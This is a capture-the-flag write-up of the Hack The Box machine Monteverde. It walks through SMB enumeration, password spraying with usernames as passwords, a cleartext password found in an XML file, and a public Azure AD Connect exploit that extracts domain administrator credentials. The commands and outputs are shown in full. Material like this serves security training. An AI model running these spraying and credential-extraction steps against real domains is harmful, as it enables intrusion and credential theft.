---
layout: post
title: Monteverde Write-up / Walkthrough - HTB
---

![monteverde badge](./montbadge.jpg)

Monteverde is a Windows machine rated Medium on HTB.

## Port Scan

`nmap -sC -sV -p- 10.10.10.172`

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain?       syn-ack ttl 127
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-04-23 05:49:49Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
<SNIP>
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

From the scan, it looks like an AD domain controller.

## Enumerating RPC and SMB

We can use enum4linux for broad enumeration through RPC and SMB protocols.

`enum4linux 10.10.10.172 | grep -v uninitialized | tee enum4linux.out`

Enum4linux (at least the one I'm using) produces many error messages, so an inverse grep is used here to remove the error messages before saving it to the file `enum4linux.out`.

The `tee` commands prints the results to stdout as well so that we can review sooner.

From the results, we gather a list of usernames.

```
 ============================= 
|    Users on 10.10.10.172    |
 ============================= 
 <SNIP>
user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
<SNIP>
```

We can format the above into a proper user list with `awk`.

`awk -F'[' '{print $2}' extractfromenum4linux.txt | awk -F']' '{print $1}' > users.txt`

Not elegant, but it does the job.

## Password Spraying

With the list of users, we try exploiting the possible weak credentials suggested by this [OWASP reference](https://wiki.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)).

Trying the usernames as passwords panned out.

```
# crackmapexec smb 10.10.10.172 -u users.txt -p users.txt 
SMB         10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK) (signing:True) (SMBv1:False)
<SNIP>
SMB         10.10.10.172    445    MONTEVERDE       [-] MEGABANK\SABatchJobs:mhope STATUS_LOGON_FAILURE 
SMB         10.10.10.172    445    MONTEVERDE       [+] MEGABANK\SABatchJobs:SABatchJobs 
```

Found credentials:

* username: SABatchJobs
* password: SABatchJobs

## Re-enumerating SMB

With this newfound set of credentials, let's try to access the SMB shares again.

The tool `smbmap` offers a convenient way to check out SMB without mounting it. In particular, the `-R` flag recurses through all the directories and lists all files.

```
root@kali:~/htb/monteverde# smbmap -u 'SABatchJobs' -p 'SABatchJobs' -H 10.10.10.172 -R
[+] IP: 10.10.10.172:445	Name: 10.10.10.172                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
  <SNIP>
	users$                                            	READ ONLY	
	.\users$\*
	dr--r--r--                0 Fri Jan  3 20:12:48 2020	.
	dr--r--r--                0 Fri Jan  3 20:12:48 2020	..
	dr--r--r--                0 Fri Jan  3 20:15:23 2020	dgalanos
	dr--r--r--                0 Fri Jan  3 20:41:18 2020	mhope
	dr--r--r--                0 Fri Jan  3 20:14:56 2020	roleary
	dr--r--r--                0 Fri Jan  3 20:14:28 2020	smorgan
	.\users$\mhope\*
	dr--r--r--                0 Fri Jan  3 20:41:18 2020	.
	dr--r--r--                0 Fri Jan  3 20:41:18 2020	..
	fw--w--w--             1212 Fri Jan  3 21:59:24 2020	azure.xml
  ```

Of the user home directories, we can only access that of mhope. Within it, we found a xml file containing a password.

```
# cat azure.xml 
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
<SNIP>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

Since this password originates from mhope's directory, it probably belongs to him.

* username: mhope
* password: 4n0therD4y@n0th3r$

## Azure AD Connect Database Exploit

### What is Azure AD Connect?

Let's say you use a mixture of on-premise and cloud applications. For ease of administration and usage, you need **hybrid identity** solutions.

A hybrid identify solution builds a common user identity for authentication and authorization, regardless of whether the resource is on-prem or in the cloud.

Azure AD Connect is Microsoft's tool to achieve hybrid identity goals.

One of the hybrid identity solutions is **Password-Hash-Synchronization (PHS)**.

### What is Password-Hash-Synchronization?

* In PHS, user password hashes are synchronized from an on-prem AD instance to a cloud-based Azure AD instance.

* This reduces the number of passwords as users use the same password for signing into both on-prem AD instances and Azure AD instances.

The synchronization request is done through the MS-DRSR replication protocol. Hence, the service account for Azure AD connect must have the permissions:

* Replicate Directory Changes 
* Replicate Directory Changes All 

Just like in a [DCSync attack](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync), compromising an account with these replicating permissions gives us a way to elevate our account.

Hence, this attack seeks to compromise the **service account running Azure AD Sync**.

### How Does The Exploit Work?

AD Connect stores the service account credentials (encrypted) in a database.

The password can be decrypted using mcrypt.dll which is located in `C:\Program Files\Microsoft Azure AD Sync\Bin\`.

Steps:

1. Connects to the database that contains the configuration data for AD Connect
2. Retrieves keying materials from table **mms_server_configuration**
3. Retrieves domain, user, and the encrypted password from **mms_management_agent**
4. Decrypts them by passing them to **mcrypt.dll**

The [PoC here](https://blog.xpnsec.com/azuread-connect-for-redteam/) automates these steps with a powershell script.

### Running The Exploit

For the exploit to work, we need to change [database connection string](https://www.connectionstrings.com/sql-server/) from:

`Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync`

to:

`Server=LocalHost;Database=ADSync;Trusted_Connection=True;`

This is because AD Sync is not using localdb here.

After making the change, let's run it.

```
*Evil-WinRM* PS C:\Users\mhope\Saved Games> ./exploit.ps1
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

Typically, we expect to get the credentials of the service account and will need to proceed to dump hashes.

But in this case, we find the administrator account credentials. So that's the end for this box.

```
$ evil-winrm -i 10.10.10.172 -u administrator -p d0m@in4dminyeah!
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
megabank\administrator
```

## Thoughts

The privilege escalation process was not technically difficult, but my unfamiliarity with the environment meant that understanding the vulnerability and exploit was a challenge.

Also, my first time encoutering Azure in a box.

**AD Sync Exploits**

* https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/
* https://blog.xpnsec.com/azuread-connect-for-redteam/
* https://github.com/fox-it/adconnectdump

**Azure AD**

* https://docs.microsoft.com/en-us/azure/active-directory/fundamentals/active-directory-whatis
* https://docs.microsoft.com/en-us/azure/active-directory/hybrid/whatis-hybrid-identity
* https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-password-hash-synchronization
* https://docs.microsoft.com/en-us/azure/active-directory/hybrid/reference-connect-accounts-permissions
